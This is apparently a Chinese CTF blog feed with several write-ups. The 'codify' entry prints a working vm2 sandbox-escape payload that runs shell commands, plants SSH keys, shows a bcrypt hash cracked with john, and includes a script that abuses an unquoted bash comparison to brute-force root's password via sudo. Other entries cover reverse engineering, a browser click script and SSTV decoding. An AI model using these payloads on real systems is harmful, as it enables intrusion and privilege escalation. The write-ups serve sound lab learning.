class="hljs-number">25805</span>, <span class="hljs-number">29200</span>, <span class="hljs-number">36021</span>, <span class="hljs-number">40589</span>, <span class="hljs-number">41428</span>, <span class="hljs-number">46450</span>, <span class="hljs-number">54099</span>, <span class="hljs-number">56800</span>, <span class="hljs-number">60001</span>, <span class="hljs-number">66213</span>, <span class="hljs-number">67554</span>, <span class="hljs-number">70735</span>, <span class="hljs-number">73866</span>, <span class="hljs-number">76755</span>]<br><br><br><span class="hljs-keyword">for</span> i in range(<span class="hljs-number">200</span>):<br>    <span class="hljs-keyword">for</span> j in range(<span class="hljs-number">200</span>):<br>        <span class="hljs-keyword">for</span> n in range(len(m)):<br>            <span class="hljs-keyword">if</span> (i ^ key[<span class="hljs-number">0</span>]) * <span class="hljs-number">300</span> + (j ^ key[<span class="hljs-number">1</span>]) == m[n] :<br>                <span class="hljs-meta">#print(i, j)</span><br>                print(chr(i), chr(j))<br></code></pre></td></tr></table></figure><p>这种逻辑可以爆破出来满足条件的字符,虽然每个位置的字符能爆破出来,但是有些位置却没有满足条件(如果每个字符是再32-126范围内)的结果,所以只能放一放了</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>codify</title>
    <link href="/2023/11/19/codify/"/>
    <url>/2023/11/19/codify/</url>
    
    <content type="html"><![CDATA[<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">PORT     STATE SERVICE VERSION<br><span class="hljs-number">22</span>/tcp   open  ssh     OpenSSH <span class="hljs-number">8.9</span>p1 Ubuntu <span class="hljs-number">3u</span>buntu0<span class="hljs-number">.4</span> (Ubuntu Linux; protocol <span class="hljs-number">2.0</span>)<br><span class="hljs-number">80</span>/tcp   open  http    Apache httpd <span class="hljs-number">2.4</span><span class="hljs-number">.52</span><br><span class="hljs-number">3000</span>/tcp open  http    Node.js Express framework<br></code></pre></td></tr></table></figure><p>通过nmap扫描主机得到的服务,3000和80端口有http服务<br><img src="/img/postimg/2/2-1.png" alt="image.png"><br>80端口加载不出来,其中3000端口是这样的,他告诉我这里可以用一些js再沙箱中,我们自然想到了沙箱逃逸<br>我又进一步再about us中发现了他其实vm2沙箱逃逸,于是我去网上搜索了解该漏洞<br>再nodejs中有作用域特点,不同的js文件其变量和函数并不互通的,想要互通需要使用exports这个接口,<br>还有一种global全局对象其下有些全局变量可以直接访问,process和console就是,global关键字也可以声明一个全局变量<br>vm沙箱原理就是通过创建一个新的作用域,让代码在其中运行,这样变形成了隔离,沙箱可以访问global中的属性,访问不了本地属性<br>在global外创建沙箱环境,防止调用global中的变量,所以沙箱逃逸的关键在于如何引入global的变量,</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> vm = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;vm&quot;</span>);<br><span class="hljs-keyword">const</span> a = vm.<span class="hljs-title function_">runInNewContext</span>(<span class="hljs-string">`this.constructor.constructor(&#x27;return global&#x27;)()`</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(a.<span class="hljs-property">process</span>);<br></code></pre></td></tr></table></figure><p>那么我们是如何实现逃逸的呢？首先这里的this指向的是当前传递给runInNewContext()的对象，这个对象不属于沙箱环境，我们通过这个对象获取到它的构造器，再获得一个构造器对象的构造器（此时为Function的constructor），最后的()是调用这个用Function的constructor生成的函数，最终返回一个global对象(来自百度)<br>一般我们都是直接用别人写好的代码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> &#123;<span class="hljs-variable constant_">VM</span>&#125; = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;vm2&quot;</span>);<br><span class="hljs-keyword">const</span> vm = <span class="hljs-keyword">new</span> <span class="hljs-title function_">VM</span>();<br><br><span class="hljs-keyword">const</span> code = <span class="hljs-string">`</span><br><span class="hljs-string">cmd = &#x27;id&#x27;</span><br><span class="hljs-string">err = &#123;&#125;;</span><br><span class="hljs-string">const handler = &#123;</span><br><span class="hljs-string">    getPrototypeOf(target) &#123;</span><br><span class="hljs-string">        (function stack() &#123;</span><br><span class="hljs-string">            new Error().stack;</span><br><span class="hljs-string">            stack();</span><br><span class="hljs-string">        &#125;)();</span><br><span class="hljs-string">    &#125;</span><br><span class="hljs-string">&#125;;</span><br><span class="hljs-string">  </span><br><span class="hljs-string">const proxiedErr = new Proxy(err, handler);</span><br><span class="hljs-string">try &#123;</span><br><span class="hljs-string">    throw proxiedErr;</span><br><span class="hljs-string">&#125; catch (&#123;constructor: c&#125;) &#123;</span><br><span class="hljs-string">    c.constructor(&#x27;return process&#x27;)().mainModule.require(&#x27;child_process&#x27;).execSync(cmd);</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string">`</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(vm.<span class="hljs-title function_">run</span>(code));<br></code></pre></td></tr></table></figure><p>现成的代码,直接带入,运行,返回了uid&#x3D;1001(svc) gid&#x3D;1001(svc) groups&#x3D;1001(svc)<br>我现在就可以使用反弹shell了,emmm报错了用不了<br>但是这台机子开了ssh我们可以使用免密登录<br>先用ssh-keygen获得id_rsa和id_rsa.pub<br>然后将id_rsa.pub上传到靶机~&#x2F;.ssh&#x2F;authorized_keys,然后就可以用ssh 用户名@ip -i id_rsa<br>在上传文件时发现了用户名为svc,创建&#x2F;home&#x2F;svc&#x2F;.ssh&#x2F;authorized_keys这个文件,然后写入<br>成功登录<br>登录的用户不是root所以需要进一步提权,进入home目录时就发现了joshua用户</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs json">drwxr-xr-x  <span class="hljs-number">4</span> joshua joshua <span class="hljs-number">4096</span> Sep <span class="hljs-number">12</span> <span class="hljs-number">17</span><span class="hljs-punctuation">:</span><span class="hljs-number">10</span> .<br>drwxr-xr-x <span class="hljs-number">18</span> root   root   <span class="hljs-number">4096</span> Oct <span class="hljs-number">31</span> <span class="hljs-number">07</span><span class="hljs-punctuation">:</span><span class="hljs-number">57</span> ..<br>drwxrwx---  <span class="hljs-number">3</span> joshua joshua <span class="hljs-number">4096</span> Nov  <span class="hljs-number">2</span> <span class="hljs-number">12</span><span class="hljs-punctuation">:</span><span class="hljs-number">22</span> joshua<br>drwxr-x---  <span class="hljs-number">5</span> svc    svc    <span class="hljs-number">4096</span> Nov <span class="hljs-number">19</span> <span class="hljs-number">06</span><span class="hljs-punctuation">:</span><span class="hljs-number">20</span> svc<br></code></pre></td></tr></table></figure><p>看起来joshua权限比svc高,但是权限问题我不能直接在joshua目录下建立.ssh目录,所以不能直接用相同方式直接登录Joshua的账号<br>然后再&#x2F;var&#x2F;www&#x2F;contact&#x2F;tickets.db中发现了这个,使用strings命令将其中可读部分cat出来</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs sql">SQLite format <span class="hljs-number">3</span><br>otableticketstickets<br><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> tickets (<br>  id <span class="hljs-type">INTEGER</span> <span class="hljs-keyword">PRIMARY</span> KEY AUTOINCREMENT,<br>                      name TEXT,<br>                      topic TEXT,<br>                      description TEXT,<br>                      status TEXT<br>)P<br><br>Ytablesqlite_sequencesqlite_sequence<br><br><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> sqlite_sequence(name,seq)<br><br>tableusersusers<br>  <br><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> users (<br>                    id <span class="hljs-type">INTEGER</span> <span class="hljs-keyword">PRIMARY</span> KEY AUTOINCREMENT, <br>                    username TEXT <span class="hljs-keyword">UNIQUE</span>, <br>                    password TEXT<br>                  ))<br>                  <br>indexsqlite_autoindex_users_1users<br><br>joshua$<span class="hljs-number">2</span>a$<span class="hljs-number">12</span>$SOn8Pf6z8fO<span class="hljs-operator">/</span>nVsNbAAequ<span class="hljs-operator">/</span>P6vLRJJl7gCUEiYBU2iLHn4G<span class="hljs-operator">/</span>p<span class="hljs-operator">/</span>Zw2<br>joshua<br>users<br>tickets<br><br>Joe WilliamsLocal setup?I use this site lot <span class="hljs-keyword">of</span> the time. <span class="hljs-keyword">Is</span> it possible <span class="hljs-keyword">to</span> <span class="hljs-keyword">set</span> this up locally? <span class="hljs-keyword">Like</span> instead <span class="hljs-keyword">of</span> coming <span class="hljs-keyword">to</span> this site, can I download this <span class="hljs-keyword">and</span> <span class="hljs-keyword">set</span> it up <span class="hljs-keyword">in</span> my own computer? A feature <span class="hljs-keyword">like</span> that would be nice.open<br>Tom HanksNeed networking modulesI think it would be better if you can implement a way <span class="hljs-keyword">to</span> handle network<span class="hljs-operator">-</span>based stuff. Would help me <span class="hljs-keyword">out</span> a lot. Thanks<span class="hljs-operator">!</span><span class="hljs-keyword">open</span><br></code></pre></td></tr></table></figure><p>然后搜索了相关的sqllite数据库文件,大致看得出有个tickets,sqlite_sequence,users表,其中users表中有账号密码,<br>下面就是joshua$2a$12$SOn8Pf6z8fO&#x2F;nVsNbAAequ&#x2F;P6vLRJJl7gCUEiYBU2iLHn4G&#x2F;p&#x2F;Zw2直接登录是不可能的了,明显不是明文<br>然后用john the ripper破解密文,得到密码成功登录joshua,再user目录中得到了第一个flag</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">joshua@codify:~$ <span class="hljs-built_in">cat</span> user.txt<br>aefc4bfea0469608b47c34e30521dd1c<br>joshua@codify:~$ <br></code></pre></td></tr></table></figure><p>使用sudo -l,看看能使用root权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">[sudo] password <span class="hljs-keyword">for</span> joshua: <br>Matching Defaults entries <span class="hljs-keyword">for</span> joshua on codify:<br>    env_reset, mail_badpass,<br>    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty<br><br>User joshua may run the following commands on codify:<br>    (root) /opt/scripts/mysql-backup.sh<br><br></code></pre></td></tr></table></figure><p>mysql-backup.sh可以运行,</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><br>DB_USER=<span class="hljs-string">&quot;root&quot;</span><br>DB_PASS=$(/usr/bin/cat /root/.creds)<br>BACKUP_DIR=<span class="hljs-string">&quot;/var/backups/mysql&quot;</span><br><br><span class="hljs-built_in">read</span> -s -p <span class="hljs-string">&quot;Enter MySQL password for <span class="hljs-variable">$DB_USER</span>: &quot;</span> USER_PASS<br>/usr/bin/echo<br><br><span class="hljs-keyword">if</span> [[ <span class="hljs-variable">$DB_PASS</span> == <span class="hljs-variable">$USER_PASS</span> ]]; <span class="hljs-keyword">then</span><br>        /usr/bin/echo <span class="hljs-string">&quot;Password confirmed!&quot;</span><br><span class="hljs-keyword">else</span><br>        /usr/bin/echo <span class="hljs-string">&quot;Password confirmation failed!&quot;</span><br>        <span class="hljs-built_in">exit</span> 1<br><span class="hljs-keyword">fi</span><br><br>/usr/bin/mkdir -p <span class="hljs-string">&quot;<span class="hljs-variable">$BACKUP_DIR</span>&quot;</span><br><br>databases=$(/usr/bin/mysql -u <span class="hljs-string">&quot;<span class="hljs-variable">$DB_USER</span>&quot;</span> -h 0.0.0.0 -P 3306 -p<span class="hljs-string">&quot;<span class="hljs-variable">$DB_PASS</span>&quot;</span> -e <span class="hljs-string">&quot;SHOW DATABASES;&quot;</span> | /usr/bin/grep -Ev <span class="hljs-string">&quot;(Database|information_schema|performance_schema)&quot;</span>)<br><br><span class="hljs-keyword">for</span> db <span class="hljs-keyword">in</span> <span class="hljs-variable">$databases</span>; <span class="hljs-keyword">do</span><br>    /usr/bin/echo <span class="hljs-string">&quot;Backing up database: <span class="hljs-variable">$db</span>&quot;</span><br>    /usr/bin/mysqldump --force -u <span class="hljs-string">&quot;<span class="hljs-variable">$DB_USER</span>&quot;</span> -h 0.0.0.0 -P 3306 -p<span class="hljs-string">&quot;<span class="hljs-variable">$DB_PASS</span>&quot;</span> <span class="hljs-string">&quot;<span class="hljs-variable">$db</span>&quot;</span> | /usr/bin/gzip &gt; <span class="hljs-string">&quot;<span class="hljs-variable">$BACKUP_DIR</span>/<span class="hljs-variable">$db</span>.sql.gz&quot;</span><br><span class="hljs-keyword">done</span><br><br>/usr/bin/echo <span class="hljs-string">&quot;All databases backed up successfully!&quot;</span><br>/usr/bin/echo <span class="hljs-string">&quot;Changing the permissions&quot;</span><br>/usr/bin/chown root:sys-adm <span class="hljs-string">&quot;<span class="hljs-variable">$BACKUP_DIR</span>&quot;</span><br>/usr/bin/chmod 774 -R <span class="hljs-string">&quot;<span class="hljs-variable">$BACKUP_DIR</span>&quot;</span><br>/usr/bin/echo <span class="hljs-string">&#x27;Done!&#x27;</span><br><br></code></pre></td></tr></table></figure><p>我们可以看到里面的源码,这里的漏洞出自于[[db_pass &#x3D;&#x3D; user_pass]]<br>再bash中[[  ]]提供了更多的功能包括模式匹配,所以再使用[[ ]],来比较字符串时需要使用引号来避免模式匹配,<br><img src="/img/postimg/2/2-1.png" alt="image.png"><br>所以我们可以编写脚本对密码进行爆破</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> string<br><span class="hljs-keyword">import</span> subprocess<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">check_password</span>(<span class="hljs-params">p</span>):<br>    command = <span class="hljs-string">f&quot;echo &#x27;<span class="hljs-subst">&#123;p&#125;</span>*&#x27; | sudo /opt/scripts/mysql-backup.sh&quot;</span><br>    result = subprocess.run(command, shell=<span class="hljs-literal">True</span>, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=<span class="hljs-literal">True</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Password confirmed!&quot;</span> <span class="hljs-keyword">in</span> result.stdout<br><br>charset = string.ascii_letters + string.digits<br>password = <span class="hljs-string">&quot;&quot;</span><br>is_password_found = <span class="hljs-literal">False</span><br><br><span class="hljs-keyword">while</span> <span class="hljs-keyword">not</span> is_password_found:<br>    <span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> charset:<br>        <span class="hljs-keyword">if</span> check_password(password + char)<br>        password += char<br>        <span class="hljs-built_in">print</span>(password)<br>        <span class="hljs-keyword">break</span><br><span class="hljs-keyword">else</span>:<br>    is_password_found = <span class="hljs-literal">True</span><br></code></pre></td></tr></table></figure><p>得到密码登录root用户后,可以再root目录下拿到最后一个flag</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>ezprocess</title>
    <link href="/2023/11/16/ezprocess/"/>
    <url>/2023/11/16/ezprocess/</url>
    
    <content type="html"><![CDATA[<p>将提供的压缩包解压出来,得到两个exe文件<br>进程执行.exe 和 another.exe<br>常规拖入ida中看看情况<br><img src="/img/postimg/2/1-1.png" alt="image.png"><br>这是进程执行那个文件的反编译情况,有几个看点,qmemcpy函数 和Createprocessw函数,一个明显跟key有关,你一个创建了一个新的进程,<br>qmemcpy将那一长串字符串存入source中,然后通过一个for循环操作,python中得到的脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">flag=<span class="hljs-string">&#x27;]]//]]Efcvh]]bopuifs/fyf!EBTDUG|Z1v(w4`cf4o`us2dl4e&quot;~&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(flag)):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(flag[i])-<span class="hljs-number">1</span>),end=<span class="hljs-string">&quot;&quot;</span>)<br><br></code></pre></td></tr></table></figure><p>得到\..\Debug\another.exe DASCTF{Y0u’v3_be3n_tr1ck3d!},剩下的代码不用看了,调用了another.exe 并且传入了DASCTF{Y0u’v3_be3n_tr1ck3d!}(不是flag)作为参数,接下来看看another<br><img src="/img/postimg/2/1-2.png" alt="image.png"><br>得到反编译结果后,很快发现有right和wrong,说明判断函数就在这里,仔细看看会发现有个crflag[ii]&#x3D;&#x3D;enflag[ii]的if语句,再从前面发现了crflag[m]&#x3D;flag[xb[m]],和key[j]&#x3D;argv[1][j],<br>有几个关键字符串key,enflag-&gt;crflag,xb[]-&gt;flag<br>key前面已经得到了key&#x3D;”DASCTF{Y0u’v3_be3n_tr1ck3d!}”<br>enflag&#x3D;”77h, 0, 72h, 17h, 0Bh, 34h, 13h, 69h, 6Fh, 21h, 54h, 45h, 6Ch, 3Eh, 3Dh, 16h, 5Ah, 3Dh, 30h, 0Dh, 11h, 61h, 30h, 4Ah, 70h, 1Fh, 52h, 39h, 2, 4, 2Eh, 10h”<br>由此我们可以得到crflag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">key=<span class="hljs-string">&quot;DASCTF&#123;Y0u&#x27;v3_be3n_tr1ck3d!&#125;&quot;</span><br>enflag=[<span class="hljs-number">0x77</span>, <span class="hljs-number">0x0</span>, <span class="hljs-number">0x72</span>, <span class="hljs-number">0x17</span>, <span class="hljs-number">0x0B</span>, <span class="hljs-number">0x34</span>, <span class="hljs-number">0x13</span>, <span class="hljs-number">0x69</span>, <span class="hljs-number">0x6F</span>, <span class="hljs-number">0x21</span>, <span class="hljs-number">0x54</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0x6C</span>, <span class="hljs-number">0x3E</span>, <span class="hljs-number">0x3D</span>, <span class="hljs-number">0x16</span>, <span class="hljs-number">0x5A</span>, <span class="hljs-number">0x3D</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x0D</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x4A</span>, <span class="hljs-number">0x70</span>, <span class="hljs-number">0x1F</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x39</span>, <span class="hljs-number">0x2</span>, <span class="hljs-number">0x4</span>, <span class="hljs-number">0x2E</span>, <span class="hljs-number">0x10</span>]<br>crflag=[]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>):<br>    a=key[i%<span class="hljs-built_in">len</span>(key)]<br>    crflag.append(enflag[i]^<span class="hljs-built_in">ord</span>(a))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(crflag[i]),end=<span class="hljs-string">&quot;&quot;</span>)<br><br></code></pre></td></tr></table></figure><p>结果是3A!T_rh0_Ts3_a_siSoycPS!C{sDFE}S<br>最后只剩下XB[]观察一下XB先是由xb[i]&#x3D;i,然后通过随机数打乱了顺序,这也是我卡住的地方,我以为是通过动态调用直接得到xb打乱后的结果,结果我动不了一点,然后我想到了伪随机,python的随机数和c的不太一样so就没搞出来<br>下来我自己痛定思痛,决定用c再搞搞,于是再一个阳光明媚的中午,翘了一节课的代价,搞了出来,并写下了这篇wp</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    srand(<span class="hljs-number">1</span>);<br>    <span class="hljs-type">int</span> xb[<span class="hljs-number">33</span>];<br>    <span class="hljs-type">char</span> crflag[] = <span class="hljs-string">&quot;3A!T_rh0_Ts3_a_siSoycPS!C&#123;sDFE&#125;S&quot;</span>;<br>    srand(<span class="hljs-string">&#x27;\x01&#x27;</span>);<br><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">33</span>;i++)xb[i] = i;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">33</span>; i++) &#123;<br>        <span class="hljs-type">int</span> j = rand();<br>        <span class="hljs-type">int</span> k = (j % <span class="hljs-number">32</span>);<br>        <span class="hljs-type">int</span> temp = xb[i];<br>        xb[i] = xb[k];<br>        xb[k] = temp;<br>        temp = <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span> (i &lt; <span class="hljs-number">32</span>) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">33</span>; j++) &#123;<br>            <span class="hljs-keyword">if</span> (xb[j] == i)<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>, crflag[j]);<br>        &#125;<br>        i++;<br>    &#125;<br><br>&#125;<br><br></code></pre></td></tr></table></figure><p>首先计算机中不存在绝对的随机,再c语言中随机数由随机种子srand决定,当srand被固定时,之后的随机数也就固定了,也就说xb[]可以得到了,再通过相关逻辑的逆推理<br>最后flag&#x3D;DASCTF{Th3_Proc3ss_iS_S0_Eas!!}</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>js script</title>
    <link href="/2023/11/13/%E6%B5%8F%E8%A7%88%E5%99%A8%E8%84%9A%E6%9C%AC/"/>
    <url>/2023/11/13/%E6%B5%8F%E8%A7%88%E5%99%A8%E8%84%9A%E6%9C%AC/</url>
    
    <content type="html"><![CDATA[<p>起因是由于hakgame中的一道题-组委会模拟器<br><img src="/img/postimg/1/3-1.png" alt="image.png"><br>其中要求在出现flag时需要用鼠标点击撤销,当然不可能让你人工就完成的<br>so我需要写个脚本来完成这件事,这当然需要javascript基础</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-built_in">setInterval</span>(<span class="hljs-function">() =&gt;</span><br>  <span class="hljs-title class_">Array</span>.<span class="hljs-title function_">from</span>(<span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelectorAll</span>(<span class="hljs-string">&quot;.fakeqq-message__bubble&quot;</span>))<br>  .<span class="hljs-title function_">filter</span>(<span class="hljs-function">(<span class="hljs-params">element</span>) =&gt;</span> element.<span class="hljs-property">innerHTML</span>.<span class="hljs-title function_">indexOf</span>(<span class="hljs-string">&quot;hack[&quot;</span>) != -<span class="hljs-number">1</span>)<br>  .<span class="hljs-title function_">forEach</span>(<span class="hljs-function">(<span class="hljs-params">element</span>) =&gt;</span> element.<span class="hljs-title function_">click</span>())<br>            , <span class="hljs-number">100</span>)<br></code></pre></td></tr></table></figure><p>分析一下wp脚本<br>setInterval()函数,有两个参数,在给定时间中循环执行函数或者计算,直到clearinterval()调用或者窗口关闭,这里就是每100毫秒执行中间的代码<br>Array.from()将可跌代或类数组的对象变成数组<br>document.querySelectorAll(“.aaa”)函数会返回class&#x3D;aaa的所有对象,这里是由于所有可点击的消息(具有click事件)都在这个类的<div>元素上<br>array.filter()过滤器将满足条件的元素集合起来创建新的数组<br>这里使用了很多箭头函数的格式,箭头函数类似匿名函数可以通过&#x3D;来赋值函数名 a&#x3D; () &#x3D;&gt; {},这样可以通过a()调用函数,箭头函数需要注意他是继承外部函数的this实例,括号中作为参数传入,并执行中括号中的函数体<br>element参数会遍历上面获取的数组执行后面的函数体,innerhtml获取对象的内容也就是标签中间的内容,indexof(“aaa”)看看获取的字符串中是否有aaa有返回第一次出现的下标,没有返回-1<br>最后foreach遍历数组,直接执行click()事件也就是点击事件<br>这里wp写得非常简洁,由于是通过获取,过滤,在执行的方式,所以这个js代码几乎可以得到任何元素在一张网页中<br><img src="/img/postimg/1/3-2.png" alt="image.png"></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-title class_">Array</span>.<span class="hljs-title function_">from</span>(<span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementByTagName</span>(<span class="hljs-string">&quot;a&quot;</span>)<br>           .<span class="hljs-title function_">filter</span>(<span class="hljs-function">(<span class="hljs-params">a</span>)=&gt;</span>a.<span class="hljs-property">innerHTML</span>.<span class="hljs-title function_">indexOf</span>(<span class="hljs-string">&quot;div&quot;</span>))<br>           .<span class="hljs-title function_">forEach</span>(<span class="hljs-function">(<span class="hljs-params">a</span>)=&gt;</span><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(a.<span class="hljs-property">innerHTML</span>)))<br></code></pre></td></tr></table></figure><p>这里我模仿上面代码获取我校的相关通知,但是也只有这一个页面而已</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>无线传输</title>
    <link href="/2023/11/13/%E6%97%A0%E7%BA%BF%E4%BC%A0%E8%BE%93/"/>
    <url>/2023/11/13/%E6%97%A0%E7%BA%BF%E4%BC%A0%E8%BE%93/</url>
    
    <content type="html"><![CDATA[<p><img src="/img/postimg/1/2-0.png" alt="image.png"><br>通过搜索iss和无线传输图片,可以找到一个关于接收国际空间站信号的活动<br><img src="/img/postimg/1/2-1.png" alt="image.png"><br>其中方式有语音中继,aprs转发,sstv下传,天地通联等等<br>这篇文章介绍的正是sstv”慢扫描电视”的古老技术<br>我们下载附件是一个.wav文件明显是一个音频文件,需要我们解码成图片<br>所以我们直接搜索sstv解码工具能够找到rx-sstv工具,<br><img src="/img/postimg/1/2-2.png" alt="image.png"><br>最后一步,需要我们将音频导入,但是没有直接导入的方式<br>间接的是一边播放,一边接收,或者下载虚拟声卡,vitrual audio cable来实现<br><img src="/img/postimg/1/2-3.png" alt="image.png"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
